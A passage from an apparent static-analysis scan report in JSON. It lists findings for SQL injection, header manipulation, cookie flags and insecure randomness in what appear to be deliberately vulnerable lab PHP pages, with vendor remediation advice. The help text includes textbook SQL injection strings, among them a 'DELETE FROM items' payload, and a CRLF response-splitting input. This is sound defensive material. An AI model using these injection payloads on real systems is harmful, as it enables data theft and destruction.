create.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4535/?engineType=SCA&issue=6D9AD425D9F247A0748CAB8C869409CE"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4555",
          "shortDescription" : {
            "text" : "Cookie Security: Cookie not Sent Over SSL"
          },
          "fullDescription" : {
            "text" : "The program creates a cookie without setting the <code>Secure</code> flag to <code>true</code>\n\n\n"
          },
          "help" : {
            "text" : "Modern web browsers support a Secure flag for each cookie. If the flag is set, the browser will only send the cookie over HTTPS. Sending cookies over an unencrypted channel can expose them to network sniffing attacks, so the secure flag helps keep a cookie's value confidential. This is especially important if the cookie contains private data or carries a session identifier.\n  \n\nExample 1: The following code adds a cookie to the response without setting the Secure flag.\n\n...\nsetcookie(\"emailCookie\", $email, 0, \"/\", \"www.example.com\");\n...\n\n\nIf an application uses both HTTPS and HTTP, but does not set the Secure flag, cookies sent during an HTTPS request will also be sent during subsequent HTTP requests. Attackers may then compromise the cookie by sniffing the unencrypted network traffic, which is particularly easy over wireless networks.\n\nSet the Secure flag on all new cookies in order to instruct browsers not to send these cookies in the clear. This can be accomplished by passing true as the sixth argument to setcookie().\n\nExample 2: The following code corrects the mistake in Example 1 by setting the Secure flag to true.\n\n\nsetcookie(\"emailCookie\", $email, 0, \"/\", \"www.example.com\", TRUE);\n\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4555/?engineType=SCA&issue=78B1FF65E2AB5A5EC0E912C3293652D6"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4608",
          "shortDescription" : {
            "text" : "Header Manipulation: Cookies"
          },
          "fullDescription" : {
            "text" : "Including unvalidated data in Cookies can lead to HTTP Response header manipulation and enable cache-poisoning, cross-site scripting, cross-user defacement, page hijacking, cookie manipulation or open redirect.\n\n\n"
          },
          "help" : {
            "text" : "Cookie Manipulation vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source, most frequently an HTTP request.\n\n2. The data is included in an HTTP cookie sent to a web user without being validated.\n\nIn this case, the data is sent at setcookie() in cookie-input.php on line 12.\n\nAs with many software security vulnerabilities, cookie manipulation is a means to an end, not an end in itself. At its root, the vulnerability is straightforward: an attacker passes malicious data to a vulnerable application, and the application includes the data in an HTTP cookie.\n\nCookie Manipulation: When combined with attacks like Cross-Site Request Forgery, attackers may change, add to, or even overwrite a legitimate user's cookies.\n\nBeing an HTTP Response header, Cookie manipulation attacks can also lead to other types of attacks like:\n\nHTTP Response Splitting:\nOne of the most common Header Manipulation attacks is HTTP Response Splitting. To mount a successful HTTP Response Splitting exploit, the application must allow input that contains CR (carriage return, also given by %0d or \\r) and LF (line feed, also given by %0a or \n)characters into the header. These characters not only give attackers control of the remaining headers and body of the response the application intends to send, but also allows them to create additional responses entirely under their control.\n\nMany of today's modern application servers will prevent the injection of malicious characters into HTTP headers. For example, recent versions of Apache Tomcat will throw an IllegalArgumentException if you attempt to set a header with prohibited characters. If your application server prevents setting headers with new line characters, then your application is not vulnerable to HTTP Response Splitting. However, solely filtering for new line characters can leave an application vulnerable to Cookie Manipulation or Open Redirects, so care must still be taken when setting HTTP headers with user input.\n\nExample: The following code segment reads the name of the author of a weblog entry, author, from an HTTP request and sets it in a cookie header of an HTTP response.\n\n\n&lt;?php\n    $author = $_GET['AUTHOR_PARAM'];\n    ...\n    header(\"author: $author\");\n?&gt;\n\n\nAssuming a string consisting of standard alphanumeric characters, such as \"Jane Smith\", is submitted in the request the HTTP response including this cookie might take the following form:\n\n\nHTTP/1.1 200 OK\n...\nSet-Cookie: author=Jane Smith\n...\n\n\nHowever, because the value of the cookie is formed of unvalidated user input the response will only maintain this form if the value submitted for AUTHOR_PARAM does not contain any CR and LF characters. If an attacker submits a malicious string, such as \"Wiley Hacker\\r\nHTTP/1.1 200 OK\\r\n...\", then the HTTP response would be split into two responses of the following form:\n\n\nHTTP/1.1 200 OK\n...\nSet-Cookie: author=Wiley Hacker\n\nHTTP/1.1 200 OK\n...\n\n\nClearly, the second response is completely controlled by the attacker and can be constructed with any header and body content desired. The ability of attacker to construct arbitrary HTTP responses permits a variety of resulting attacks, including: cross-user defacement, web and browser cache poisoning, cross-site scripting, and page hijacking.\n\nCross-User Defacement: An attacker will be able to make a single request to a vulnerable server that will cause the server to create two responses, the second of which may be misinterpreted as a response to a different request, possibly one made by another user sharing the same TCP connection with the server. This can be accomplished by convincing the user to submit the malicious request themselves, or remotely in situations where the attacker and the user share a common TCP connection to the server, such as a shared proxy server. In the best case, an attacker may leverage this ability to convince users that the application has been hacked, causing users to lose confidence in the security of the application. In the worst case, an attacker may provide specially crafted content designed to mimic the behavior of the application but redirect private information, such as account numbers and passwords, back to the attacker.\n\nCache Poisoning: The impact of a maliciously constructed response can be magnified if it is cached either by a web cache used by multiple users or even the browser cache of a single user. If a response is cached in a shared web cache, such as those commonly found in proxy servers, then all users of that cache will continue receive the malicious content until the cache entry is purged. Similarly, if the response is cached in the browser of an individual user, then that user will continue to receive the malicious content until the cache entry is purged, although only the user of the local browser instance will be affected.\n\nCross-Site Scripting: Once attackers have control of the responses sent by an application, they have a choice of a variety of malicious content to provide users. Cross-site scripting is common form of attack where malicious JavaScript or other code included in a response is executed in the user's browser. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. The most common and dangerous attack vector against users of a vulnerable application uses JavaScript to transmit session and authentication information back to the attacker who can then take complete control of the victim's account.\n\nPage Hijacking: In addition to using a vulnerable application to send malicious content to a user, the same root vulnerability can also be leveraged to redirect sensitive content generated by the server and intended for the user to the attacker instead. By submitting a request that results in two responses, the intended response from the server and the response generated by the attacker, an attacker may cause an intermediate node, such as a shared proxy server, to misdirect a response generated by the server for the user to the attacker. Because the request made by the attacker generates two responses, the first is interpreted as a response to the attacker's request, while the second remains in limbo. When the user makes a legitimate request through the same TCP connection, the attacker's request is already waiting and is interpreted as a response to the victim's request. The attacker then sends a second request to the server, to which the proxy server responds with the server generated request intended for the victim, thereby compromising any sensitive information in the headers or body of the response intended for the victim.\n\nOpen Redirect: Allowing unvalidated input to control the URL used in a redirect can aid phishing attacks.\n\nThe solution to prevent Cookie Manipulation is to ensure that input validation occurs in the required places and checks for the correct properties.\n\nSince Header Manipulation vulnerabilities like cookie manipulation occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating responses dynamically, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for Header Manipulation.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for Header Manipulation is generally relatively easy. Despite its value, input validation for Header Manipulation does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent Header Manipulation vulnerabilities is to validate everything that enters the application or leaves the application destined for the user.\n\nThe most secure approach to validation for Header Manipulation is to create an allow list of safe characters that can appear in HTTP response headers and accept input composed exclusively of characters in the approved set. For example, a valid name might only include alphanumeric characters or an account number might only include digits 0-9.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning in HTTP response headers. Although the CR and LF characters are at the heart of an HTTP response splitting attack, other characters, such as ':' (colon) and '=' (equal), have special meaning in response headers as well.\n\nAfter you identify the correct points in an application to perform validation for Header Manipulation attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. The application should reject any input destined to be included in HTTP response headers that contains special characters, particularly CR and LF, as invalid.\n\nMany application servers attempt to limit an application's exposure to HTTP response splitting vulnerabilities by providing implementations for the functions responsible for setting HTTP headers and cookies that perform validation for the characters essential to an HTTP response splitting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4608/?engineType=SCA&issue=9954AB0C6ED596105A480B962ECF2824"
          },
          "properties" : {
            "tags" : [ "High" ],
            "precision" : "low"
          }
        }, {
          "id" : "4682",
          "shortDescription" : {
            "text" : "Cookie Security: HTTPOnly not Set"
          },
          "fullDescription" : {
            "text" : "The program creates a cookie in cookie-input.php on line 12, but fails to set the <code>HttpOnly</code> flag to <code>true</code>.\n\n\n"
          },
          "help" : {
            "text" : "All major browsers support the HttpOnly cookie property that prevents client-side scripts from accessing the cookie. Cross-site scripting attacks often access cookies in an attempt to steal session identifiers or authentication tokens. Without HttpOnly enabled, attackers have easier access to user cookies.\n  \nIn this case, a cookie is set in cookie-input.php on line 12, but the HttpOnly parameter is not set or is set to false.\n  \n\nExample 1: The following code creates a cookie without setting the HttpOnly property.\n\nsetcookie(\"emailCookie\", $email, 0, \"/\", \"www.example.com\", TRUE);  //Missing 7th parameter to set HttpOnly\n\n\nEnable the HttpOnly property when you create cookies. You can do this by setting the HttpOnly parameter in the setcookie() call to true.\n\nExample 2: The following code creates the same cookie as the code in Example 1, but this time sets the HttpOnly parameter to true.\n\nsetcookie(\"emailCookie\", $email, 0, \"/\", \"www.example.com\", TRUE, TRUE);\n\n\nSeveral mechanisms to bypass setting HttpOnly to true have been developed, and therefore it is not completely effective.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4682/?engineType=SCA&issue=D00FD97D76054B3935104F546EA878F4"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4450",
          "shortDescription" : {
            "text" : "SQL Injection"
          },
          "fullDescription" : {
            "text" : "Line 12 of high.php invokes a SQL query built with input that comes from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
          },
          "help" : {
            "text" : "SQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n\n\n2. The data is used to dynamically construct a SQL query.\n\n\nIn this case, the data is passed to mysqli_query() in high.php on line 12.\n\n\nExample 1: The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.\n\n\n\t...\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = '$userName' AND itemname = '$itemName';\";\n\t$result = mysql_query($query);\n\t...\n\n\nThe query intends to execute the following code:\n\n\n\tSELECT * FROM items\n\tWHERE owner = &lt;userName&gt;\n\tAND itemname = &lt;itemName&gt;;\n\n\nHowever, because the query is constructed dynamically by concatenating a constant query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string \"name' OR 'a'='a\" for itemName, then the query becomes the following:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name' OR 'a'='a';\n\n\nThe addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:\n\n\n\tSELECT * FROM items;\n\n\nThis simplification of the query allows the attacker to bypass the requirement that the query must only return items owned by the authenticated user. The query now returns all entries stored in the items table, regardless of their specified owner.\n\nExample 2: This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name wiley enters the string \"name'; DELETE FROM items; --\" for itemName, then the query becomes the following two queries:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\t--'\n\n\nMany database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.\n\nNotice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string \"name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a\", the following three valid statements will be created:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\tSELECT * FROM items WHERE 'a'='a';\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nWhen connecting to MySQL, the previous example can be rewritten to use parameterized SQL statements (instead of concatenating user supplied strings) as follows:\n\n\n\t...\n\t$mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n\t$stmt = $mysqli-&gt;prepare($query);\n\t$stmt-&gt;bind_param('ss',$username,$itemName);\n\t$stmt-&gt;execute();\n\t...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4450/?engineType=SCA&issue=39EB2C6F81B6A70F3154AE02730DEBE5"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4686",
          "shortDescription" : {
            "text" : "Insecure Randomness"
          },
          "fullDescription" : {
            "text" : "The random number generator implemented by rand() cannot withstand a cryptographic attack.\n\n\n"
          },
          "help" : {
            "text" : "Insecure randomness errors occur when a function that can produce predictable values is used as a source of randomness in a security-sensitive context.\n\nIn this case, the function that generates weak random numbers is rand() in high.php on line 47.\n\nComputers are deterministic machines, and as such are unable to produce true randomness. Pseudorandom Number Generators (PRNGs) approximate randomness algorithmically, starting with a seed from which subsequent values are calculated.\n\nThere are two types of PRNGs: statistical and cryptographic. Statistical PRNGs provide useful statistical properties, but their output is highly predictable and form an easy to reproduce numeric stream that is unsuitable for use in cases where security depends on generated values being unpredictable. Cryptographic PRNGs address this problem by generating output that is more difficult to predict. For a value to be cryptographically secure, it must be impossible or highly improbable for an attacker to distinguish between the generated random value and a truly random value. In general, if a PRNG algorithm is not advertised as being cryptographically secure, then it is probably a statistical PRNG and should not be used in security-sensitive contexts, where its use can lead to serious vulnerabilities such as easy-to-guess temporary passwords, predictable cryptographic keys, session hijacking, and DNS spoofing.\n\nExample: The following code uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase.\n\n\n  function genReceiptURL($baseURL) {\n    $randNum = rand();\n    $receiptURL = $baseURL . $randNum . \".html\";\n    return $receiptURL;\n  }\n\n\nThis code uses the rand() function to generate \"unique\" identifiers for the receipt pages it generates. Since rand() is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG.\n\nWhen unpredictability is critical, as is the case with most security-sensitive uses of randomness, use a cryptographic PRNG. Regardless of the PRNG you choose, always use a value with sufficient entropy to seed the algorithm. (Do not use values such as the current time because it offers only negligible entropy.)\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4686/?engineType=SCA&issue=D4CBEA47781BABCD72DADDD9BC2BE2DB"
          },
          "properties" : {
            "tags" : [ "High" ],
            "precision" : "low"
          }
        }, {
          "id" : "4433",
          "shortDescription" : {
            "text" : "Insecure Randomness"
          },
          "fullDescription" : {
            "text" : "The random number generator implemented by rand() cannot withstand a cryptographic attack.\n\n\n"
          },
          "help" : {
            "text" : "Insecure randomness errors occur when a function that can produce predictable values is used as a source of randomness in a security-sensitive context.\n\nIn this case, the function that generates weak random numbers is rand() in high.php on line 48.\n\nComputers are deterministic machines, and as such are unable to produce true randomness. Pseudorandom Number Generators (PRNGs) approximate randomness algorithmically, starting with a seed from which subsequent values are calculated.\n\nThere are two types of PRNGs: statistical and cryptographic. Statistical PRNGs provide useful statistical properties, but their output is highly predictable and form an easy to reproduce numeric stream that is unsuitable for use in cases where security depends on generated values being unpredictable. Cryptographic PRNGs address this problem by generating output that is more difficult to predict. For a value to be cryptographically secure, it must be impossible or highly improbable for an attacker to distinguish between the generated random value and a truly random value. In general, if a PRNG algorithm is not advertised as being cryptographically secure, then it is probably a statistical PRNG and should not be used in security-sensitive contexts, where its use can lead to serious vulnerabilities such as easy-to-guess temporary passwords, predictable cryptographic keys, session hijacking, and DNS spoofing.\n\nExample: The following code uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase.\n\n\n  function genReceiptURL($baseURL) {\n    $randNum = rand();\n    $receiptURL = $baseURL . $randNum . \".html\";\n    return $receiptURL;\n  }\n\n\nThis code uses the rand() function to generate \"unique\" identifiers for the receipt pages it generates. Since rand() is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG.\n\nWhen unpredictability is critical, as is the case with most security-sensitive uses of randomness, use a cryptographic PRNG. Regardless of the PRNG you choose, always use a value with sufficient entropy to seed the algorithm. (Do not use values such as the current time because it offers only negligible entropy.)\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4433/?engineType=SCA&issue=2DA3814C829E18CE5FD3AA12A3EBDFB8"
          },
          "properties" : {
            "tags" : [ "High" ],
            "precision" : "low"
          }
        }, {
          "id" : "4493",
          "shortDescription" : {
            "text" : "SQL Injection"
          },
          "fullDescription" : {
            "text" : "Line 12 of low.php invokes a SQL query built with input that comes from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
          },
          "help" : {
            "text" : "SQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n\n\n2. The data is used to dynamically construct a SQL query.\n\n\nIn this case, the data is passed to mysqli_query() in low.php on line 12.\n\n\nExample 1: The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.\n\n\n\t...\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = '$userName' AND itemname = '$itemName';\";\n\t$result = mysql_query($query);\n\t...\n\n\nThe query intends to execute the following code:\n\n\n\tSELECT * FROM items\n\tWHERE owner = &lt;userName&gt;\n\tAND itemname = &lt;itemName&gt;;\n\n\nHowever, because the query is constructed dynamically by concatenating a constant query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string \"name' OR 'a'='a\" for itemName, then the query becomes the following:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name' OR 'a'='a';\n\n\nThe addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:\n\n\n\tSELECT * FROM items;\n\n\nThis simplification of the query allows the attacker to bypass the requirement that the query must only return items owned by the authenticated user. The query now returns all entries stored in the items table, regardless of their specified owner.\n\nExample 2: This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name wiley enters the string \"name'; DELETE FROM items; --\" for itemName, then the query becomes the following two queries:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\t--'\n\n\nMany database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.\n\nNotice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string \"name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a\", the following three valid statements will be created:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\tSELECT * FROM items WHERE 'a'='a';\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nWhen connecting to MySQL, the previous example can be rewritten to use parameterized SQL statements (instead of concatenating user supplied strings) as follows:\n\n\n\t...\n\t$mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n\t$stmt = $mysqli-&gt;prepare($query);\n\t$stmt-&gt;bind_param('ss',$username,$itemName);\n\t$stmt-&gt;execute();\n\t...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4493/?engineType=SCA&issue=5A0F32B85F1CC235D243B03CC86A1A9E"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4459",
          "shortDescription" : {
            "text" : "SQL Injection: Poor Validation"
          },
          "fullDescription" : {
            "text" : "Line 14 of medium.php invokes an SQL query built using input coming from an untrusted source and uses HTML, XML, or other types of encoding that is not always enough to prevent malicious characters from being inserted into the query.\n\n\n"
          },
          "help" : {
            "text" : "The use of encoding functions such as mysql_real_escape_string() will prevent some, but not all SQL injection vulnerabilities. Relying on such encoding functions is equivalent to using a weak deny list to prevent SQL injection and might allow the attacker to modify the statement's meaning or to execute arbitrary SQL commands. Since it is not always possible to determine statically where input will appear within a given section of dynamically interpreted code, the Fortify Secure Coding Rulepacks may present validated dynamic SQL data as \"SQL Injection: Poor Validation\" issues, even though the validation may be sufficient to prevent SQL Injection within that context.\n\nSQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n\n\n2. The data is used to dynamically construct a SQL query.\n\n\nIn this case, the data is passed to mysqli_query() in medium.php on line 14.\n\n\nExample 1: The following example demonstrates how the configuration of the database can alter the behavior of mysqli_real_escape_string(). When the SQL mode is set to \"NO_BACKSLASH_ESCAPES\" the backslash character is treated as a normal character, and not an escape character[5]. Since mysqli_real_escape_string() takes this into account, the following query is vulnerable to SQL injection as \" is no longer escaped to \\\" due to the database configuration.\n\n\n  mysqli_query($mysqli, 'SET SQL_MODE=\"NO_BACKSLASH_ESCAPES\"');\n  ...\n  $userName = mysqli_real_escape_string($mysqli, $_POST['userName']);\n  $pass = mysqli_real_escape_string($mysqli, $_POST['pass']);\n  $query = 'SELECT * FROM users WHERE userName=\"' . $userName . '\"AND pass=\"' . $pass. '\";';\n  $result = mysqli_query($mysqli, $query);\n  ...\n\n\nIf an attacker leaves the password field blank and enters \" OR 1=1;--  for userName the quotation marks will not be escaped and the resulting query is as follows:\n\n\n  SELECT * FROM users\n  WHERE userName = \"\"\n  OR 1=1;\n  -- \"AND pass=\"\";\n\n\nSince OR 1=1 causes the where clause to always evaluate to true and the double hyphens cause the rest of the statement to be treated as a comment, the query becomes logically equivalent to the much simpler query:\n\n\n  SELECT * FROM users;\n\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nExample 2: When connecting to MySQL, parameterized SQL statements should always be used instead of dynamically concatenating user supplied input, as follows:\n\n\n  ...\n  $mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n  $userName = $_SESSION['userName'];\n  $itemName = $_POST['itemName'];\n  $query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n  $stmt = $mysqli-&gt;prepare($query);\n  $stmt-&gt;bind_param('ss',$username,$itemName);\n  $stmt-&gt;execute();\n  ...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4459/?engineType=SCA&issue=3F5E7A9E44323081569A476563B14944"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4639",
          "shortDescription" : {
            "text" : "Often Misused: File Upload"
